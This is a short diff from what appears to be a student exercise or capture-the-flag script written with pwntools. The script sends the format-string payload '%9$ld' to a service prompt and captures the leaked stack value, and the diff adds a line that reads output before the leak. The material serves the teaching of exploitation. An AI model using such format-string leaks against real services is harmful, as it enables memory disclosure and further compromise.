@@ -11,7 +11,7 @@ for i in range(10):
     # Add your code Here
     r.recvuntil(b"Recipient? ") # Think about what should be received first?
     r.sendline(b"%9$ld") # Add your format string code here!
-    
+    r.recvuntil(b"Sending to ")
     leak = r.recvline()
     # Add your code to receive leak val here , format: val = leak[idx_1:idx_2], please think about the idx
     val = leak.strip() # you need to fill in idx_1, and idx_2 by yourself
